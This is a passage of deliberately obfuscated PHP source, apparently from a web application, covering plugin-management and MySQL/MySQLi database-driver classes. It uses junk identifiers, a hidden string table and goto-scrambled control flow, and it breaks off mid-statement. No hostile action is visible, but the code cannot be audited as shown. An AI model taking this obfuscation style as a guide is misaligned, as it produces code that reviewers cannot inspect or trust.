EœÁÚ†ªÕÄ: $AïØì›ÅÁ­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($f°»¬êŸÊá && !is_array($f°»¬êŸÊá)) { $f°»¬êŸÊá = array($f°»¬êŸÊá); } $f´‡¼ëæß­ = $this->listData($a²®ËòƒÉ”); goto eøŠøò¼; FÖÕ§Á›©: foreach ($c²öÛ¨ô×… as $bí§½àãã => $d×”‰œé›) { $aÙªôóĞá = !0; if (!$f°»¬êŸÊá) { $fÛ‡‘ÉôÈ[] = $bí§½àãã; continue; } foreach ($f°»¬êŸÊá as $eçŞƒ©ô£) { if (!in_array($eçŞƒ©ô£, $d×”‰œé›)) { $aÙªôóĞá = !1; break; } } if ($aÙªôóĞá) { $fÛ‡‘ÉôÈ[] = $bí§½àãã; } } if (!$fÛ‡‘ÉôÈ) { return array(); } $dÏ¡ËÄ„‘ = array($AïØì›ÅÁ­[412] => array($AïØì›ÅÁ­[413], $fÛ‡‘ÉôÈ), $AïØì›ÅÁ­[498] => $a²®ËòƒÉ”, $AïØì›ÅÁ­[406] => SourceModel::TYPE_GROUP); goto eÇëÅƒåˆ¯; eøŠøò¼: $c²öÛ¨ô×… = array(); foreach ($f´‡¼ëæß­ as $f½„»±¸ÚÍ) { $Cì±îåÃÄí = $f½„»±¸ÚÍ[$AïØì›ÅÁ­[76]]; if (!$Cì±îåÃÄí) { continue; } if (!isset($c²öÛ¨ô×…[$Cì±îåÃÄí])) { $c²öÛ¨ô×…[$Cì±îåÃÄí] = array(); } $c²öÛ¨ô×…[$Cì±îåÃÄí][] = $f½„»±¸ÚÍ[$AïØì›ÅÁ­[421]]; } $fÛ‡‘ÉôÈ = array(); goto FÖÕ§Á›©; A¯ïùÇŒ¤Û: foreach ($fÛ‡‘ÉôÈ as $Cì±îåÃÄí) { if (!in_array($Cì±îåÃÄí, $Aº¶Ê‰âšå)) { $bĞõÇßÖÔ¤[] = $Cì±îåÃÄí; } } if ($bĞõÇßÖÔ¤) { $this->removeBySource($a²®ËòƒÉ”, $bĞõÇßÖÔ¤); } return $DÀŞÆˆ§‚¦; goto FöÃõ­šÃ; FöÃõ­šÃ: } protected function listData($F¥¿œ¼ÍÛ­) { $AâÃ¬Œ§ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BøôÂ°íóĞ = array($AâÃ¬Œ§ç[1541] => 0, $AâÃ¬Œ§ç[477] => array($AâÃ¬Œ§ç[1830], 0), $AâÃ¬Œ§ç[417] => $AâÃ¬Œ§ç[1831] . $F¥¿œ¼ÍÛ­); $A¢©ñÄ†œô = $AâÃ¬Œ§ç[1832]; $f¾£ŠîÜğŒ = $this->field($A¢©ñÄ†œô)->where($BøôÂ°íóĞ)->order($AâÃ¬Œ§ç[1833])->select(); return $f¾£ŠîÜğŒ ? $f¾£ŠîÜğŒ : array(); } protected function addToTag($Eˆğ°ŸÃ¸, $a†Ää¾‹º, $b½ÒËÏ»Óó) { $bİÂ¿Öˆ’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->getByTagID($Eˆğ°ŸÃ¸, $b½ÒËÏ»Óó) || !$a†Ää¾‹º) { return !1; } if (!Model($bİÂ¿Öˆ’[813])->pathInfo($a†Ää¾‹º)) { return !1; } $EØ®ºÌ–ï = array($bİÂ¿Öˆ’[1541] => 0, $bİÂ¿Öˆ’[477] => $b½ÒËÏ»Óó, $bİÂ¿Öˆ’[416] => $a†Ää¾‹º, $bİÂ¿Öˆ’[417] => $bİÂ¿Öˆ’[1834] . $Eˆğ°ŸÃ¸, $bİÂ¿Öˆ’[415] => $bİÂ¿Öˆ’[33], $bİÂ¿Öˆ’[1723] => 0); if ($this->where($EØ®ºÌ–ï)->find()) { return !1; } return $this->add($EØ®ºÌ–ï); } protected function removeFromTag($F„¶’ÖİµŞ, $eŠ ­Ç¿ë¬, $C¡¹ÉÄ¾ßë) { $CƒíøøØÔÚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->getByTagID($F„¶’ÖİµŞ, $C¡¹ÉÄ¾ßë) || !$eŠ ­Ç¿ë¬) { return !1; } if (is_array($eŠ ­Ç¿ë¬)) { $eŠ ­Ç¿ë¬ = array($CƒíøøØÔÚ[7], $eŠ ­Ç¿ë¬); } $DÙğ‹š¶ôŞ = array($CƒíøøØÔÚ[1541] => 0, $CƒíøøØÔÚ[477] => $C¡¹ÉÄ¾ßë, $CƒíøøØÔÚ[417] => $CƒíøøØÔÚ[1834] . $F„¶’ÖİµŞ, $CƒíøøØÔÚ[416] => $eŠ ­Ç¿ë¬); return $this->where($DÙğ‹š¶ôŞ)->delete(); } protected function removeByTag($fÔ» ÷øöù, $F™ØÈĞá¡ò) { $bàÍÉ‚ªÉµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->getByTagID($fÔ» ÷øöù, $F™ØÈĞá¡ò)) { return !1; } $f–Ê‘ã·â = array($bàÍÉ‚ªÉµ[1541] => 0, $bàÍÉ‚ªÉµ[477] => $F™ØÈĞá¡ò, $bàÍÉ‚ªÉµ[417] => $bàÍÉ‚ªÉµ[1834] . $fÔ» ÷øöù); return $this->where($f–Ê‘ã·â)->delete(); } protected function removeBySource($C™Ëê„¾ßê, $CÉ¾Í‘ìŠ©) { $AÜä…£™óò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$C™Ëê„¾ßê || !$CÉ¾Í‘ìŠ©) { return !1; } if (is_array($CÉ¾Í‘ìŠ©)) { $CÉ¾Í‘ìŠ© = array($AÜä…£™óò[7], $CÉ¾Í‘ìŠ©); } $fÜ÷êµ—ÊÇ = array($AÜä…£™óò[1541] => 0, $AÜä…£™óò[416] => $CÉ¾Í‘ìŠ©, $AÜä…£™óò[477] => array($AÜä…£™óò[994], 0), $AÜä…£™óò[417] => $AÜä…£™óò[1834] . $C™Ëê„¾ßê); return $this->where($fÜ÷êµ—ÊÇ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x70\x6c\165\x67\x69\156\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\163\164\x61\164\x75\163", "\162\x65\147\x69\x65\x73\x74", "\143\x6f\156\146\151\x67"); public function loadList($AÎ¥×ÊÚ«„ = false) { $eÕ²‰¶‡³‘ = array_to_keyvalue($this->listData(), $_SERVER[Ôğ—¤Šµˆ˜ñ£][28]); if ($AÎ¥×ÊÚ«„) { return $eÕ²‰¶‡³‘[$AÎ¥×ÊÚ«„]; } return $eÕ²‰¶‡³‘; } public function init() { $a¥À¿ŸĞ¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Hook::trigger($a¥À¿ŸĞ¹[1835]); $B¢¾Ë …ã• = $this->loadPluginList(); foreach ($B¢¾Ë …ã• as $c³¹¦Ÿ…“ê => $d™äá¥³â¦) { $Eã¯’ÁÀ = $this->appAllow($c³¹¦Ÿ…“ê, $d™äá¥³â¦); if (!$Eã¯’ÁÀ) { continue; } foreach ($d™äá¥³â¦[$a¥À¿ŸĞ¹[1836]] as $d¡Âëöß›ğ => $a‘ãÕ«±Á) { Hook::bind($d¡Âëöß›ğ, $a‘ãÕ«±Á); } } Hook::trigger($a¥À¿ŸĞ¹[1837]); Hook::trigger(ACTION); } public function appAllow($AÛ÷ÇæÍÕ, $FÂÂ‚»ÉÆ´, $BÒÒ—¯·§Á = true) { $dæêôŒÅèš =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b¬Íù’æáï = PLUGIN_DIR . $AÛ÷ÇæÍÕ . $dæêôŒÅèš[1838]; if (!is_array($FÂÂ‚»ÉÆ´) || !is_array($FÂÂ‚»ÉÆ´[$dæêôŒÅèš[1836]]) || $FÂÂ‚»ÉÆ´[$dæêôŒÅèš[731]] != 1 || !is_file($b¬Íù’æáï)) { return !1; } if ($GLOBALS[$dæêôŒÅèš[499]] == 1) { return !0; } if ($BÒÒ—¯·§Á && !Action($dæêôŒÅèš[1839])->checkAuth($AÛ÷ÇæÍÕ)) { return !1; } return !0; } public function unInstall($a ìªˆ§¼ñ) { $fäõ©çÇ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aï’„Ÿ‹ò„ = $this->loadList($a ìªˆ§¼ñ); if (file_exists(PLUGIN_DIR . $a ìªˆ§¼ñ)) { Hook::apply($a ìªˆ§¼ñ . $fäõ©çÇ[1840]); } $this->remove($aï’„Ÿ‹ò„[$fäõ©çÇ[395]]); } public function changeStatus($BŒ›ä„Ìš±, $Fô‡³×—’) { $eíİÙá¿† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A™±¥ÊÒ™ = $this->loadList($BŒ›ä„Ìš±); if ($Fô‡³×—’) { Hook::apply($BŒ›ä„Ìš± . $eíİÙá¿†[1841]); } $this->update($A™±¥ÊÒ™[$eíİÙá¿†[395]], array($eíİÙá¿†[1842] => $Fô‡³×—’)); } public function appRegist($B±òÃ†§Üì, $eñİéâôÁÍ) { $Aãã¼¸ºøî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÙ©ÆéÅœ… = $this->loadList($B±òÃ†§Üì); if ($cÙ©ÆéÅœ…) { $this->update($cÙ©ÆéÅœ…[$Aãã¼¸ºøî[395]], array($Aãã¼¸ºøî[1836] => $eñİéâôÁÍ)); } else { $fÄñÅœÒ©Œ = array($Aãã¼¸ºøî[28] => $B±òÃ†§Üì, $Aãã¼¸ºøî[1836] => $eñİéâôÁÍ, $Aãã¼¸ºøî[731] => 0, $Aãã¼¸ºøî[6] => $this->getConfigDefault($B±òÃ†§Üì)); $this->insert($fÄñÅœÒ©Œ); } } public function getConfigDefault($Eªï‹³Ìã×) { $FÛáºøõ© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dµ¶‡ÅŞ…Ü = array(); $dô·ğ¤œÓÎ = $this->getPackageJson($Eªï‹³Ìã×); if (!$dô·ğ¤œÓÎ && is_array($dô·ğ¤œÓÎ[$FÛáºøõ©[1843]])) { return $dµ¶‡ÅŞ…Ü; } foreach ($dô·ğ¤œÓÎ[$FÛáºøõ©[1843]] as $Bè—ïÊµ˜† => $d÷æôÆë†Ú) { if (!isset($d÷æôÆë†Ú[$FÛáºøõ©[372]]) || isset($dµ¶‡ÅŞ…Ü[$Bè—ïÊµ˜†])) { continue; } $dµ¶‡ÅŞ…Ü[$Bè—ïÊµ˜†] = $d÷æôÆë†Ú[$FÛáºøõ©[372]]; } return $dµ¶‡ÅŞ…Ü; } public function getPackageJson($aÄ÷ÆÙ‡) { return Hook::apply($aÄ÷ÆÙ‡ . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1844]); } public function getConfig($b——ÙÛÚÏ, $aêñ²âß„ = false) { $EÑ¶‹“‹° =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aå§¸ùæ = array(); $DÃ›ï²ğÜ = $this->loadList($b——ÙÛÚÏ); if ($DÃ›ï²ğÜ && is_array($DÃ›ï²ğÜ[$EÑ¶‹“‹°[6]])) { $aå§¸ùæ = $DÃ›ï²ğÜ[$EÑ¶‹“‹°[6]]; } if (!$aå§¸ùæ || $aêñ²âß„) { $aå§¸ùæ = $this->getConfigDefault($b——ÙÛÚÏ); } return $aå§¸ùæ; } public function setConfig($bå…Á¡Ûóš, $dæß¼‹âÙ = false) { goto fä©†ãŸù«; Bê‹·«ÄÏ: $this->update($F±´ïİ„[$cŒÏíåÅ[395]], array($cŒÏíåÅ[6] => $eÒÑí»ŒÔ‘)); goto Dì‘Ó¦ñòß; fä©†ãŸù«: $cŒÏíåÅ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F±´ïİ„ = $this->loadList($bå…Á¡Ûóš); if (!$F±´ïİ„) { return !1; } goto eİš’¿ÓóÑ; eİš’¿ÓóÑ: $eÒÑí»ŒÔ‘ = $F±´ïİ„[$cŒÏíåÅ[6]]; if ($dæß¼‹âÙ == !1) { $eÒÑí»ŒÔ‘ = array(); $dæß¼‹âÙ = $this->getConfigDefault($bå…Á¡Ûóš); } foreach ($dæß¼‹âÙ as $E¸«–Ç‡Üğ => $cßèÃ‡Ÿß) { $eÒÑí»ŒÔ‘[$E¸«–Ç‡Üğ] = is_string($cßèÃ‡Ÿß) ? trim($cßèÃ‡Ÿß) : $cßèÃ‡Ÿß; } goto Bê‹·«ÄÏ; Dì‘Ó¦ñòß: } public function viewList() { goto C‹°¹ÖëÍ­; D¤†İâæ¥ö: return $fç¹ÚŠÊÚ¢; goto bµ‰™‹¹…‰; C‹°¹ÖëÍ­: $d°Òù½òï¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DšÃ§î™âµ = $this->loadList(); $this->pluginScan($DšÃ§î™âµ); goto b¿ÇÅÖ‚»; b¿ÇÅÖ‚»: $DšÃ§î™âµ = $this->loadPluginList(); $fç¹ÚŠÊÚ¢ = array(); foreach ($DšÃ§î™âµ as $f†«ÓóÅ¹ => $DÓ¤Š‹œí‚) { unset($DÓ¤Š‹œí‚[$d°Òù½òï¯[1836]], $DÓ¤Š‹œí‚[$d°Òù½òï¯[6]]); $B‚ÙÂ‚ñğâ = PLUGIN_DIR . $DÓ¤Š‹œí‚[$d°Òù½òï¯[28]] . $d°Òù½òï¯[1838]; if (!is_file($B‚ÙÂ‚ñğâ)) { continue; } $Aêµ¥«°× = Hook::apply($DÓ¤Š‹œí‚[$d°Òù½òï¯[28]] . $d°Òù½òï¯[1844]); if (is_array($Aêµ¥«°×)) { $fç¹ÚŠÊÚ¢[$f†«ÓóÅ¹] = array_merge($DÓ¤Š‹œí‚, $Aêµ¥«°×); } } goto D¤†İâæ¥ö; bµ‰™‹¹…‰: } private function loadPluginList() { $BÔå³¶”Š£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eàõŠ¢Â‹ = $this->loadList(); if (strtolower(MOD) == $BÔå³¶”Š£[1845]) { return $eàõŠ¢Â‹; } $a÷»Ï¬Øã = Hook::trigger($BÔå³¶”Š£[1846], $eàõŠ¢Â‹); if ($eàõŠ¢Â‹ && !$a÷»Ï¬Øã) { die; } return $a÷»Ï¬Øã ? $a÷»Ï¬Øã : $eàõŠ¢Â‹; } private function pluginScan($d¬‚ÊŒå³£) { $c¢¼œ‡éŠ¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; recursion_dir(PLUGIN_DIR, $f˜İïŒ’Ôˆ, $DŒÃ™•…‹Ó, 0); foreach ($f˜İïŒ’Ôˆ as $C®†¦ ‡Ñ×) { $cÍ©¬ëˆÔ = get_path_this($C®†¦ ‡Ñ×); if (isset($d¬‚ÊŒå³£[$cÍ©¬ëˆÔ]) || !file_exists($C®†¦ ‡Ñ× . $c¢¼œ‡éŠ¹[1847]) || !file_exists($C®†¦ ‡Ñ× . $c¢¼œ‡éŠ¹[1838])) { continue; } Hook::apply($cÍ©¬ëˆÔ . $c¢¼œ‡éŠ¹[1841]); } } } goto dÜ¼Ö«»êò; fà¾×ñïŒÍ: class DbMysql extends Db { public function __construct($c™Şœ¤Šíù = '') { $A­ºÍ°ÑÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!extension_loaded($A­ºÍ°ÑÈ[782])) { think_exception(think_lang($A­ºÍ°ÑÈ[10]) . $A­ºÍ°ÑÈ[868]); } if (!empty($c™Şœ¤Šíù)) { $this->config = $c™Şœ¤Šíù; if (empty($this->config[$A­ºÍ°ÑÈ[13]])) { $this->config[$A­ºÍ°ÑÈ[13]] = $A­ºÍ°ÑÈ[33]; } } } public function connect($A‹ìÈ‚æğ = '', $aº¡—Äƒ£„ = 0, $dÂôÌ“™ = false) { $Fñ’ó‹¹Œ« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->linkID[$aº¡—Äƒ£„])) { goto f›µœÎÓ×÷; A†Ñ ¯å¤: if ($fîÇÏÚÈÀ) { $this->linkID[$aº¡—Äƒ£„] = mysql_pconnect($eëç†ëØ¬µ, $A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[871]], $A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[872]], 131072); } else { $this->linkID[$aº¡—Äƒ£„] = mysql_connect($eëç†ëØ¬µ, $A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[871]], $A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[872]], !0, 131072); } if (!$this->linkID[$aº¡—Äƒ£„] || !empty($A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[17]]) && !mysql_select_db($A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[17]], $this->linkID[$aº¡—Äƒ£„])) { think_exception(mysql_error()); } $e‰…°­¥ = mysql_get_server_info($this->linkID[$aº¡—Äƒ£„]); goto bòÍé…ŸÒô; bòÍé…ŸÒô: mysql_query($Fñ’ó‹¹Œ«[873] . think_config($Fñ’ó‹¹Œ«[874]) . $Fñ’ó‹¹Œ«[55], $this->linkID[$aº¡—Äƒ£„]); if ($e‰…°­¥ > $Fñ’ó‹¹Œ«[875]) { mysql_query($Fñ’ó‹¹Œ«[876], $this->linkID[$aº¡—Äƒ£„]); } $this->connected = !0; goto D­‘’×¿Ã¹; D­‘’×¿Ã¹: if (1 != think_config($Fñ’ó‹¹Œ«[18])) { unset($this->config); } goto eå‰¢õÏìƒ; f›µœÎÓ×÷: if (empty($A‹ìÈ‚æğ)) { $A‹ìÈ‚æğ = $this->config; } $eëç†ëØ¬µ = $A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[869]] . ($A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[870]] ? "\x3a{$A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[870]]}" : $Fñ’ó‹¹Œ«[33]); $fîÇÏÚÈÀ = !empty($A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[13]][$Fñ’ó‹¹Œ«[14]]) ? $A‹ìÈ‚æğ[$Fñ’ó‹¹Œ«[13]][$Fñ’ó‹¹Œ«[14]] : $this->pconnect; goto A†Ñ ¯å¤; eå‰¢õÏìƒ: } return $this->linkID[$aº¡—Äƒ£„]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eÈæéÉÙ) { goto d‹ÊÈŒÄ•ø; d‹ÊÈŒÄ•ø: $E›Ÿµ–ªİœ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (0 === stripos($eÈæéÉÙ, $E›Ÿµ–ªİœ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto c™˜¶èŸˆ; c™˜¶èŸˆ: if (!$this->_linkID) { return !1; } $this->queryStr = $eÈæéÉÙ; if ($this->queryID) { $this->free(); } goto bŒ™ÛĞâƒ®; d™Û¶ñ‚Åè: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto C»öÛĞ‘Ôù; bŒ™ÛĞâƒ®: think_action_status($E›Ÿµ–ªİœ[19], 1); think_status($E›Ÿµ–ªİœ[20]); $this->queryID = mysql_query($eÈæéÉÙ, $this->_linkID); goto d™Û¶ñ‚Åè; C»öÛĞ‘Ôù: } public function execute($añä¯Š“ •) { goto a»ÄØÇ¯; BŠŒ›ËÆ¬: $this->queryStr = $añä¯Š“ •; if ($this->queryID) { $this->free(); } think_action_status($dí˜¶½°æ¤[21], 1); goto F÷«ôó§«Š; a»ÄØÇ¯: $dí˜¶½°æ¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BŠŒ›ËÆ¬; eŠÜßŒñé: if (!1 === $E­«‘â£ƒ½) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d³ò¿æ§†ã; F÷«ôó§«Š: think_status($dí˜¶½°æ¤[20]); $E­«‘â£ƒ½ = mysql_query($añä¯Š“ •, $this->_linkID); $this->debug(); goto eŠÜßŒñé; d³ò¿æ§†ã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ôğ—¤Šµˆ˜ñ£][877], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f»ß©æù¹² = mysql_query($_SERVER[Ôğ—¤Šµˆ˜ñ£][878], $this->_linkID); $this->transTimes = 0; if (!$f»ß©æù¹²) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $AŠÂƒé®¢ = mysql_query($_SERVER[Ôğ—¤Šµˆ˜ñ£][879], $this->_linkID); $this->transTimes = 0; if (!$AŠÂƒé®¢) { $this->error(); return !1; } } return !0; } private function getAll() { $aæÂß•›æ… = array(); if ($this->numRows > 0) { while ($F¦‡Åó¥ºİ = mysql_fetch_assoc($this->queryID)) { $aæÂß•›æ…[] = $F¦‡Åó¥ºİ; } mysql_data_seek($this->queryID, 0); } return $aæÂß•›æ…; } public function getFields($bÜªªÂ‚•») { $C¬ÕÛçâ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D††õĞÚ‚ = $this->query($C¬ÕÛçâ[880] . $this->parseKey($bÜªªÂ‚•»)); $Bòƒ¶“ŠÒ = array(); if ($D††õĞÚ‚) { foreach ($D††õĞÚ‚ as $CŠÈóó±‘Ë => $bãğ¼º¬½œ) { $Bòƒ¶“ŠÒ[$bãğ¼º¬½œ[$C¬ÕÛçâ[27]]] = array($C¬ÕÛçâ[28] => $bãğ¼º¬½œ[$C¬ÕÛçâ[27]], $C¬ÕÛçâ[29] => $bãğ¼º¬½œ[$C¬ÕÛçâ[30]], $C¬ÕÛçâ[31] => (bool) (strtoupper($bãğ¼º¬½œ[$C¬ÕÛçâ[32]]) === $C¬ÕÛçâ[881]), $C¬ÕÛçâ[34] => $bãğ¼º¬½œ[$C¬ÕÛçâ[35]], $C¬ÕÛçâ[36] => strtolower($bãğ¼º¬½œ[$C¬ÕÛçâ[37]]) == $C¬ÕÛçâ[38], $C¬ÕÛçâ[39] => strtolower($bãğ¼º¬½œ[$C¬ÕÛçâ[40]]) == $C¬ÕÛçâ[41]); } } return $Bòƒ¶“ŠÒ; } public function getTables($aÆÌ£Šç‚ = '') { $eİò¥• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!empty($aÆÌ£Šç‚)) { $f°Æ¤Œ­“Ä = $eİò¥•[882] . $aÆÌ£Šç‚ . $eİò¥•[883]; } else { $f°Æ¤Œ­“Ä = $eİò¥•[884]; } $fã‘ñ¥Şí = $this->query($f°Æ¤Œ­“Ä); $AÉÓ»ï—ÚŒ = array(); foreach ($fã‘ñ¥Şí as $fÛÍé¯´àÂ => $cÄ‹Úôç‚) { $AÉÓ»ï—ÚŒ[$fÛÍé¯´àÂ] = current($cÄ‹Úôç‚); } return $AÉÓ»ï—ÚŒ; } public function replace($b˜§‹öâ·í, $CæµŠì÷ª£ = array()) { $c†ƒ¥ÄÕÃ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($b˜§‹öâ·í as $b‚†é·´’Ò => $d²¾»Íø‹») { $D­¨¦Á‘»ñ = $this->parseValue($d²¾»Íø‹»); if (is_scalar($D­¨¦Á‘»ñ)) { $Aê¦“îºÃê[] = $D­¨¦Á‘»ñ; $eç˜½ÂßÈ“[] = $this->parseKey($b‚†é·´’Ò); } } $cÓë÷æŒùÜ = $c†ƒ¥ÄÕÃ¡[885] . $this->parseTable($CæµŠì÷ª£[$c†ƒ¥ÄÕÃ¡[277]]) . $c†ƒ¥ÄÕÃ¡[886] . implode($c†ƒ¥ÄÕÃ¡[47], $eç˜½ÂßÈ“) . $c†ƒ¥ÄÕÃ¡[887] . implode($c†ƒ¥ÄÕÃ¡[47], $Aê¦“îºÃê) . $c†ƒ¥ÄÕÃ¡[888]; return $this->execute($cÓë÷æŒùÜ); } public function insertAll($eËÑïÕæŸ, $D‰¼¯Èë— = array(), $EÒ¨ĞÎÙÍ = false) { goto fŠô¯Ùß; e«¤«ºãç¾: $cµÈˆ¼‹”ª = array(); foreach ($eËÑïÕæŸ as $BÄ¸æóŞ”œ) { $aš¿„Ì¿Ü· = array(); foreach ($BÄ¸æóŞ”œ as $eˆÒ±ºÈÎ© => $bî²ÎŠõî‘) { $bî²ÎŠõî‘ = $this->parseValue($bî²ÎŠõî‘); if (is_scalar($bî²ÎŠõî‘)) { $aš¿„Ì¿Ü·[] = $bî²ÎŠõî‘; } } $cµÈˆ¼‹”ª[] = $a¢µáµ—Íƒ[258] . implode($a¢µáµ—Íƒ[47], $aš¿„Ì¿Ü·) . $a¢µáµ—Íƒ[888]; } array_walk($CŞÀ©”¼™, array($this, $a¢µáµ—Íƒ[889])); goto Eš§©§¶‰º; Eš§©§¶‰º: $bêŠÍÔèˆª = ($EÒ¨ĞÎÙÍ ? $a¢µáµ—Íƒ[890] : $a¢µáµ—Íƒ[891]) . $a¢µáµ—Íƒ[892] . $this->parseTable($D‰¼¯Èë—[$a¢µáµ—Íƒ[277]]) . $a¢µáµ—Íƒ[886] . implode($a¢µáµ—Íƒ[47], $CŞÀ©”¼™) . $a¢µáµ—Íƒ[893] . implode($a¢µáµ—Íƒ[47], $cµÈˆ¼‹”ª); return $this->execute($bêŠÍÔèˆª); goto BÒĞ‚¬Ò; fŠô¯Ùß: $a¢µáµ—Íƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_array($eËÑïÕæŸ[0])) { return !1; } $CŞÀ©”¼™ = array_keys($eËÑïÕæŸ[0]); goto e«¤«ºãç¾; BÒĞ‚¬Ò: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $aòØôæ¤Û =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->error = mysql_errno() . $aòØôæ¤Û[4] . mysql_error($this->_linkID); if ($aòØôæ¤Û[33] != $this->queryStr) { $this->error .= LNG($aòØôæ¤Û[45]) . $this->queryStr; } think_trace($this->error, $aòØôæ¤Û[33], $aòØôæ¤Û[46]); return $this->error; } public function escapeString($Bƒ´³µçÉÙ) { if ($this->_linkID) { return mysql_real_escape_string($Bƒ´³µçÉÙ, $this->_linkID); } else { return mysql_escape_string($Bƒ´³µçÉÙ); } } public function parseKey(&$EÚÏÖ½²ô, $dÙÕ¦Ş­Ôõ = true) { $FÄ‹åìŸâì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($dÙÕ¦Ş­Ôõ) { $EÚÏÖ½²ô = $this->parseKeyCheck($EÚÏÖ½²ô); } if ($EÚÏÖ½²ô != $FÄ‹åìŸâì[182] && !preg_match($FÄ‹åìŸâì[894], $EÚÏÖ½²ô)) { $EÚÏÖ½²ô = $FÄ‹åìŸâì[383] . trim($EÚÏÖ½²ô, $FÄ‹åìŸâì[383]) . $FÄ‹åìŸâì[383]; } return $EÚÏÖ½²ô; } } class DbMysqli extends Db { public function __construct($D‘°ã¢¸¯™ = '') { $c¥ø‘ÚôÍ· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!extension_loaded($c¥ø‘ÚôÍ·[781])) { think_exception(think_lang($c¥ø‘ÚôÍ·[10]) . $c¥ø‘ÚôÍ·[895]); } if (!empty($D‘°ã¢¸¯™)) { $this->config = $D‘°ã¢¸¯™; if (empty($this->config[$c¥ø‘ÚôÍ·[13]])) { $this->config[$c¥ø‘ÚôÍ·[13]] = $c¥ø‘ÚôÍ·[33]; } } } public function connect($bòØ·‰ÆçÜ = '', $F›µššƒ† = 0) { $d¤ÂƒÒˆç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->linkID[$F›µššƒ†])) { goto FŒèé¡Á’; Aá®®Üö¡¨: $B…Ø½Öšåï = $this->linkID[$F›µššƒ†]->server_version; $this->linkID[$F›µššƒ†]->query($d¤ÂƒÒˆç[873] . think_config($d¤ÂƒÒˆç[874]) . $d¤ÂƒÒˆç[55]); if ($B…Ø½Öšåï > $d¤ÂƒÒˆç[875]) { $this->linkID[$F›µššƒ†]->query($d¤ÂƒÒˆç[876]); } goto a­²ÂÎ‰¬; a­²ÂÎ‰¬: $this->connected = !0; if (1 != think_config($d¤ÂƒÒˆç[18])) { unset($this->config); } goto b‚¢ƒëµ’¹; FŒèé¡Á’: if (empty($bòØ·‰ÆçÜ)) { $bòØ·‰ÆçÜ = $this->config; } $this->linkID[$F›µššƒ†] = new mysqli($bòØ·‰ÆçÜ[$d¤ÂƒÒˆç[869]], $bòØ·‰ÆçÜ[$d¤ÂƒÒˆç[871]], $bòØ·‰ÆçÜ[$d¤ÂƒÒˆç[872]], $bòØ·‰ÆçÜ[$d¤ÂƒÒˆç[17]], $bòØ·‰ÆçÜ[$d¤ÂƒÒˆç[870]] ? intval($bòØ·‰ÆçÜ[$d¤ÂƒÒˆç[870]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Aá®®Üö¡¨; b‚¢ƒëµ’¹: } return $this->linkID[$F›µššƒ†]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a “ƒÕ«Õô) { goto c‹ñ¿Ôõ¡Â; CŒğÃà­µù: $this->queryStr = $a “ƒÕ«Õô; if ($this->queryID) { $this->free(); } think_action_status($D—‡­‚çÖ[19], 1); goto BèÆÊìÖ¬É; c‹ñ¿Ôõ¡Â: $D—‡­‚çÖ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CŒğÃà­µù; BèÆÊìÖ¬É: think_status($D—‡­‚çÖ[20]); $this->queryID = $this->_linkID->query($a “ƒÕ«Õô); if ($this->_linkID->more_results()) { while (($d˜–‡¬¬ˆä = $this->_linkID->next_result()) != 